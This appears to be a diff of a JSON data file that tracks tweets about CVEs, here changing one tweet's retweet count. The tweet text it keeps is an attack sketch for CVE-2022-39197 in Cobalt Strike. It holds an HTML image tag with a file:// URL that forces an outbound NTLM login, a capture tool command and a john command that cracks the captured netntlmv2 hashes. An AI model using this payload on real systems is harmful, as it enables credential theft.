@@ -169,7 +169,7 @@
     "tweetfavorites": 366,
     "tweetquotes": 9,
     "tweetreplies": 7,
-    "tweetretweets": 142,
+    "tweetretweets": 141,
     "tweettext": "#CVE-2022-39197 Cobalt Strike \n\n&lt;html&gt;&lt; img src='file://x.x.x.x/netntlm2'%&gt;\npython3 https://t.co/L4ftnwVwvh -I eth0\njohn --format=netntlmv2 --wordlist=pass.txt creds.txt https://t.co/wwRkdYiWcZ",
     "tweettime": "2022-09-23, 04:41:49",
     "tweeturl": "https://twitter.com/jas502n/status/1573170747807506432",
